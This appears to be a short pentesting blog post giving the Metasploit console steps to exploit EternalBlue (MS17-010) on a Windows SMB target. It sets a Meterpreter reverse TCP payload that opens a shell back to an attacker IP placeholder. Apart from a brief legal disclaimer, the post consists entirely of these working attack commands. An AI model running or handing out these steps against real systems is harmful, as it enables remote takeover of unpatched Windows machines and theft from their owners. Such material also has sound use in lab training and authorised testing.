---
layout: post
title: "Exploit ETERNALBLUE with Metasploit"
tags: [metasploit,eternalblue,smb,pentesting,windows]
---

> **Disclaimer**: Only use this in your own environment. Using this exploit against other people's systems is *illegal*!

Run `msfconsole`:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set rhost <TARGET_IP>
set lhost <ATTACKER_IP>
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

---
